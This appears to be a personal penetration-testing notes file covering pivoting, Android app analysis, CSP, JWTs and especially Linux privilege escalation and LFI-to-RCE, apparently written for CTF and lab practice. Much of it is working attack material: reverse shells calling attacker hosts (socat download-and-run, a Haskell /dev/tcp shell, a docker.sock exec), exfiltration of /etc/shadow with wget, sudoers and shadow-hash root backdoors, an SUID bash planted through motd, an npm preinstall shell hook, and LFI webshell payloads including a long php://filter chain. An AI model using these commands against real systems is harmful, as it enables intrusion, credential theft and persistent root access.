* * *
NOTES
* * *

--------------------------------

### **Webhooks**:

- [Request Catcher](https://requestcatcher.com/)
- [Postb.in](https://www.postb.in/)

---------------------------------

### Portforwarding with SSH and proxychains

- Edit the `/etc/proxychains` file and comment `sock4 127.0.0.1 9050` and change sock5's port value to your desired port

- Connect with dynamic portforwarding with ssh

      ssh -l id_rsa -D {proxychains' sock5 port number}

- To scan the internal network with nmap,use

      proxychains nmap -sT 127.0.0.1

- To local port forward

      sudo ssh -l id_rsa -L {port you want to forwrd through}:127.0.0.1:{remote port discovered}  

-------------------------------

### Removing `\r` in `exploitdb` scripts

    sed -i -e 's/\r$//' <script's name>

--------------------------------

### Port Forwarding with chisel

- Set up a server with `chisel server -p <port> --reverse` on the attacker machine
- On the client's machine, use `./chisel client [chisel server's ip]:[chisel's server port} R:[port you want it to tunnel through on the server's machine]:127.0.0.1:[internal port running a service on the victim's machine]`

---------------------------------

### To replace the root hash by generating a new one

- Use `openssl passwd -6 (password)`
- Clear the root hash in `/etc/shadow` and replace it with your hash, notice the highlighted part

  ![image](https://github.com/user-attachments/assets/8270951c-d313-4bf8-9f28-4ac5a58db988)

- Format-:```root:<hash>:18195:0:99999:7:::```
----------------------------------

### Installing adb-tools on Kali Linux[Ubuntu/Debian]

    sudo apt-get install android-sdk-platform-tools


### ADB-Tools

- Use `adb devices` to see devices connected
- Use `adb shell pm path <package name>` to get the apk package name
- Use `adb pull <package name>` to download apk locally

### STATIC ANALYSIS

- Use this grep examples to check for  weak cryptography e.g exposed private key

          grep -r "SecretKeySpec" *
      
          grep -rli "aes" *
      
          grep -rli "iv"

- To check for exported preferences, check the `AndroidManifest.xml` with grep

      cat AndroidManifest.xml | grep "activity" --color ##To check activities
      cat AndroidManifest.xml | grep "android:allowBackup" --color ## To check the app allows backup access
      cat AndroidManifest.xml | grep "android:debuggable" --color ### Check if the app is debuggable,it makes it easier to reverse engineer if debuggable
      cat AndroidManifest.xml | grep "android:" --color #finding android permissions

- Apps permission
  Apps can be `normal` or `dangerous`, normal perms don't pose risks or dangers if granted but `dangerous` ones pose otherwise

- Discovering Firebase Scanner

  `git clone https://github.com/shivsahni/FireBaseScanner`
  
  - Commands

     `python FireBaseScanner.py -p /path/apk`

--------------------------

### POP3 login

- Use

      telnet <ip> <port>
      USER <username>
      PASS <password>
  
-------------------------- 

### Content-Security-Policy 
- Content-Security-Policy prevents execution of inline javascript code and sets a trusted list of stylesheets,scripts and plugin to be allowed by the browser.
     - Examples of inline javascript

           <script>alert("5");</script>
      
- Use the http header `Content-Security-Policy` to dictate the security policy of the content.

-Essence of the header include
   - Prevents execution of inline scripts
   - Provides a list of a safe external domains for the browser to load scripts

### Directives used by the Content-Security-Policy header

Policy: `Content-Security-Policy: script-src 'self' https://safe-external-site.com; style-src 'self'`

- `Script-src`: It tells the browser where to load scripts from, `self` indicates that scripts should be loaded from the same domain or loaded from domain `https://safe-external-site.com`
- The `style-src` directs the browser to load from the same domain and not an external one.

- You can also create a CSP directive within a `<meta>` tag e.g

  `<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://safe-external-site.com">`

- `unsafe-inline` directives defeats the purpose of CSP and allows execution of inline scripts which is not highly recommended.(Smells like XSS)
- default-src: Defines the default policy for fetching all resources. Whenever a more specific policy is absent, the browser will fallback to the default-src policy directive. Example: default-src 'self' trusted-domain.com
- img-src: Defines valid sources for images, e.g. img-src 'self' img.mydomain.com
- Font-src: Defines valid sources for font resources.
- object-src: Defines valid sources for plugins and external content, like <object> or <embed> elements.
- Media-src: Defines valid sources for audio and video

### Sources allowed
    
    'none' : Match nothing.
    'self': Match the current host domain (same origin, i.e. host and port). Do not match subdomains, though.
    'unsafe-inline': Allow inline JavaScript and CSS.
    'unsafe-eval': Allow dynamic text to JavaScript evaluations.
    domain.example.com: Allow loading resource from the specified domain. To match any subdomain, use the * wildcard, e.g. *.example.com
    https: or ws:: Allow loading resources only over HTTPS or WebSocket.
    nonce-{token}: Allow an inline script or CSS containing the same nonce attribute value.
  
   
### Explaining Nonce

- `Nonce` attribute allows us to use specific inline attributes without the need to enable the `unsafe-inline` attributes.It is an attribute of the `<script>` and `<style>` tag.

### How does it work

- For every request, the server creates a base64 encoded value that cannot be guessed.Then, the server includes it in every allowed inline tag allowed. e.g

  <script nonce="dGhpcyBpcyBhIG5v==">alert("5")</script>

- The nonce is also indicated in the inline `<style>` and `<script>` tag allowed e.g

      Content-Security-Policy: script-src 'nonce-dGhpcyBpcyBhIG5v=='; style-src 'nonce-dGhpcyBpcyBhIG5v=='

--------------------

References:

--------------------

- CSP: [AKSHAY](https://www.writesoftwarewell.com/content-security-policy/)

--------------------

### ABUSING NPM INSTALL node package-lock.json to get shell access

- Change file's details  to
  
              {
              "name": ".nodeitems",
              "scripts": {
                      "preinstall": "[shell code]"
               }
            }

--------------------

### TERMUX: Adding tmux to your ~/.zlogin to prevent errors

      if [-z "$TMUX"]; then
      exec tmux
      fi
- Explanation: $TMUX vsriable prevents nested tmux instances are started on login shells. `exec` will replace current process with a new one i.e. current shell will be terminated and tmux instance with shell inside will be started, so you won't need to exit twice.

-------------------

### Adding tmux to your custom zsh shell

- Add tmux plugin to your plugins

      plugins(tmux)

- Set `ZSH_TMUX_AUTOSTART=true` in your `.zshrc`
- Note that you have to add this assignment before the line

      source $ZSH/oh-my-zsh.sh

-------------------

### 0XTIberius's sql payload

- [OxTiberius'slist](https://tib3rius.com/sqli.html)

-------------------

### Using /usr/bin/script to spawn shell

      /usr/bin/script -qc /bin/bash /dev/null
      ctrl + z
      stty raw -echo; fg; reset

---------------------

### Spawning shell with socat

- Attack Machine
  
      socat file:`tty`,raw,echo=0 tcp-listen:[port]

- Victim machine

      wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[ip]:[port]

-----------------------

### Privesc with PATH HIJACKING

- If the path to a binary is not specified in a script or binary e.g `tar instead of /usr/bin/tar`, you can set the environmental variable with `export PATH=.:$PATH` to check the current directory for our malcious binary before moving to `/usr/bin` to grab a binary.

- Our Malicious tar file should contain this if python3 is present on the victim machine

      #! /usr/bin/env python3 
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- Python
      
      #! /usr/bin/env python
      print("Malicious me")
      import os
      os.setuid(0)
      os.setgid(0)
      os.system("/bin/bash")

- Use `chmod +x tar` later


### REFERENCES:

- [Nguyen](https://securitynguyen.com/posts/linux-privilege-escalation/path-hijacking-linux-privilege-escalation/)

---------------------------

### Exploiting right to modify ssh motd(message of the day) in `/etc/update-motd.d`

- Write the sh code to 00-header, the code grants suid bit to the bash file copied to a user's directory, `<username>` represents the user you have access to

      echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header

- Exit the ssh connection and reconnect, then run

      ./bash -p


### REFERENCES
   
- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)

----------------------------------------

### Interesting way to access root

- Add your user to the `/etc/sudoers` file and grant power to execute all commands

      echo "<user> ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers

------------------------------

### Abusing docker.sock unix socket

- If a docker container contains a `docker.sock` file,you can find it with `find / -name docker.sock 2</dev/null`

![image](https://github.com/user-attachments/assets/5bf2e2ef-f333-426b-9dbe-eb414b88e1d6)

- Make it accessible on the machine with socat

      socat TCP-LISTEN:[PORT],reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

   ### Getting a revshell as root on the container

   - List all containers to get their ids

          curl http://localhost:[port]/containers/json

   - Add the id to this link, replace cmd's value with your rev shell code

         curl http://localhost:8080/containers/[existing container's id]/exec -X POST -H  "Content-Type: application/json" -d '{"AttachStdin":false, "AttachStdout":true, "AttachStderr":true, "Tty":false, "Privileged":false, "Cmd":["socat","TCP:[ip]:[port]","EXEC:bash"]}'

  - Start the container with id from the output the command above

        curl http://localhost:8080/exec/<id>/start -X POST -H "Content-Type: application/json"  -d '{"Detach": false,"Tty": false}'

- Mounting host partition on docker

      mkdir /tmp/mnt
      mount /dev/<partition> /tmp/mnt
      chroot /tmp/mnt
      mount -t proc proc /proc # Mount /proc to allow access to hardware information and running processes

--------------------

### References:

- [Quarkslab](https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html)
- [Dejandayoff](https://dejandayoff.com/the-danger-of-exposing-docker.sock/)

----------------------

### Privesc with doas 

- Doas allows execution of commands as another user
- Find `doas.conf` with

      find / -name "doas.conf" -type f 2</dev/null

![image](https://github.com/user-attachments/assets/cfc414f8-1003-4122-a731-66f8f096f89b)

- To execute commands,use

       doas -u <user> <command> <args>
       e.g doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null

--------------------------

### Exploiting GIT to gain sensitive information


### REFERENCES

- [Some OP medium blog](https://satyasai1460.medium.com/how-git-folder-can-be-exploited-to-access-sensitive-data-eb805c38fd6c)

----------------------------

### PRIVESC with /usr/bin/wget

![image](https://github.com/user-attachments/assets/592ffb4a-8c02-479f-b0be-6bc6b131435d)

- File read,set up a listener with nc on your attack machine to receive
- Send file with

      sudo -u root /usr/bin/wget post-file=/etc/shadow <ip>:<port>

- To receive file

      sudo -u root /usr/bin/wget http://<ip>:<port>/filename -O <save name>

### REFERENCES

- [HDKS](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)

----------------------------

### LFI2RCE with apache2 server's log

- Log location-:`/var/log/apache2/access.log`
- Host a command shell php code with python's http.server

  ![image](https://github.com/user-attachments/assets/e2e7c58f-4e52-44bc-aaa5-1c3f2cec9e49)

- RCE:
  - Exploit HTTP-Header `User-Agent`
    e.g

         curl http://mafialive.thm/test.php\?view\=/var/www/html/development_testing/.././.././.././.././var/log/apache2/access.log -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<http server's ip>:<http server'sport>/shell.php')) ?>"
  - Reload the log file to execute code
  - Sometimes you need to set the file path of shell.php to a path with write permissions

 ----------------------------
 
 ### REFERNCES:

 - [Roquenight](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
   
---------------------------------

### Abusing suid flask

- Sudoers rule

![image](https://github.com/user-attachments/assets/5402e95f-60ca-4b2d-a2b3-a5d200399287)
 
- Poc code
  
            import os
            from flask import Flask,render_template_string
            
            app = Flask(__name__)
            os.setuid(0)
            os.setgid(0)
            os.system("bash -p")
            
            @app.route("/")
            def index():
                return render_template_string("Life tuff ooo!!!!")
            
            if __name__ == "__main__":
               app.run(port=8080,debug=True)

- Set the environmetal variables

      export FLASK_APP=app.py
      export FLASK_ENV=development

- Run
       sudo -u root /usr/bin/flask run

- Root

![image](https://github.com/user-attachments/assets/34e3c7a7-03b6-4b1b-b857-bdb93143c5e9)

---------------------------

### Executing Shell Commands with Haskell code

- Save as run.hs

      import System.Process
      
      main = callCommand "bash -c 'bash -i 5<> /dev/tcp/10.8.158.229/1337 0<&5 1>&5 2>&5'"

---------------------------

### REFERENCES:

- [Stack Overflow](https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell)

---------------------------

### LFI2RCE with php://filter/

- Characters can be injected via php://temp/ filter
- Generate php code with this [script](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
  
- Example of `<?=`$_GET[0]`;;?>` as generated by the author

        php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

- To execute webshell e.g

      http://127.0.0.1/?0=id&file=[filter generated above]

- Sweet RCE[Test on Inclusiveness PG PLAY]

--------------------------------

### REFERENCES:

- [SundaeGan](https://medium.com/@sundaeGAN/php-wrapper-and-lfi2rce-81c536ef7a06)
- [Script's Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

---------------------------------

### Abusing group `lxd`

- If a user is part of the user `lxd`,we can create a vulnerable container and breakout as root

![image](https://github.com/user-attachments/assets/b84714a0-20dd-440d-a8f1-40e13d8f7bb4)

- Initialize lxd with `lxd init` and add this settings

![image](https://github.com/user-attachments/assets/28d07b8e-944c-4889-9872-6f15b4ff94cf)

- Create this a container in your machine and build with root

      git clone https://github.com/saghul/lxd-alpine-builder.git
      cd lxd-alpine-builder
      ./build-alpine

- Transfer it to the victim machine,receive in the user's home directory

- Import with

      lxc image import [tar file] --alias alpine
      lxc image list #To list images

![image](https://github.com/user-attachments/assets/1fe4327a-67ca-4ef9-9e1f-0b0f634abb78)

- The next step is to run a privileged container, so it runs as root

      lxc init alpine juggernaut -c security.privileged=true
      lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
      lxc start juggernaut
      lxc list

![image](https://github.com/user-attachments/assets/d3ebab8c-5738-4817-8c9b-5a4bbcadce18)

- Then execute juggernaut

      lxc exec juggernaut sh

- Use `chroot /mnt/root` to change root filesystem since we've mounted it

![image](https://github.com/user-attachments/assets/f7c9426f-b04c-4539-bce9-2afa182b4ec8)

- Then,you can replace the root hash in `/etc/shadow` and login as root

---------------------

### REFERENCES

- [Juggernaut Sec](https://juggernaut-sec.com/lxd-container/)

----------------------

### Attacking JWTs [JSON Web Token]

- It is a standardized format of cryptographically signed json data between systems.It is used for authentication, session handling and access control mechanisms.

### JWT formats

- It consist of 3 headers,which includes `header`,`payload` and `signature`.The header consists of metadata of a token, the payload contains the user details or claim.It should be noted that this headers are base64 encoded e.g

- Typical Jwt:

      eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA
  
- Header-:

      eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9

- Payload-:

        eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ

- Base64 decoded value of the payload-:

        {"iss":"portswigger","exp":1648037164,"name":"Carlos Montoya","sub":"carlos","role":"blog_author","email":"carlos@carlos-montoya.net","iat":1516239022fQ

- The signature is generated by hashing the header and payload. In order to generate the token, a secret signing key is required, the server hashes the header and payload with the secret key to generate the jwt.The signing key is required to generate the correct signature of header and payload.

### JWT vs JWS vs JWE

- JSON Web Token is not used without Json Web Signature and JSON Web Encryption, When people use the term `JWT` , it also means a JWS token. JWEs are very similar except the actual contents are encrypted and not encoded.




